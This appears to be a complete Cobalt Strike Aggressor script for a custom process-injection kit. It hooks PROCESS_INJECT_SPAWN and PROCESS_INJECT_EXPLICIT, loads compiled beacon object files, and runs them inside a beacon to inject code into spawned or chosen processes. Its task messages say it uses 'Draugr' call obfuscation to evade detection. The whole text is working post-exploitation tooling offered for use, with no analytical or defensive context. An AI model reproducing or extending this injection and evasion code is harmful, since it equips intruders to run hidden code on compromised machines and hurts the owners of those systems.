println("[*] Process inject kit loaded")

set PROCESS_INJECT_SPAWN {

   println("Process Inject - PROCESS_INJECT_SPAWN hook");

   local('$barch $handle $data $args $entry');
 
   $barch = barch($1);
 
    $handle = openf(script_resource("bin/inject_spawn.o"));
   $data   = readb($handle, -1);

   closef($handle);

    println("Custom kit by @RtlDallas");
   println("Process Inject - " . $pi_object);
   println("Process Inject - Length " . strlen($data));

   # pack our arguments needed for the BOF
   $args = bof_pack($1, "sb", $3, $2);
 
   btask($1, "Process Inject using fork and run with Draugr for call obfuscation.");
 
   $entry = "go";
   beacon_inline_execute($1, $data, $entry, $args);
 
   return 1;
}

set PROCESS_INJECT_EXPLICIT {

   println("Process Inject - PROCESS_INJECT_EXPLICIT hook");

   local('$barch $handle $data $args $entry');
 
   $barch = barch($1);
 
   $handle = openf(script_resource("bin/inject_explicit.o"));
   $data   = readb($handle, -1);
   closef($handle);

    println("Custom kit by @RtlDallas");
   println("Process Inject - Length " . strlen($data));
   println("Process Inject - Target PID " . $3);
 
   # pack our arguments needed for the BOF
   $args = bof_pack($1, "iib", $3, $4, $2);
 
   btask($1, "Process Inject using explicit injection into pid $3 with Draugr for call obfuscation.");
 
   # Set the entry point based on the dll's arch
   $entry = "go";
   beacon_inline_execute($1, $data, $entry, $args);
 
   return 1;
}

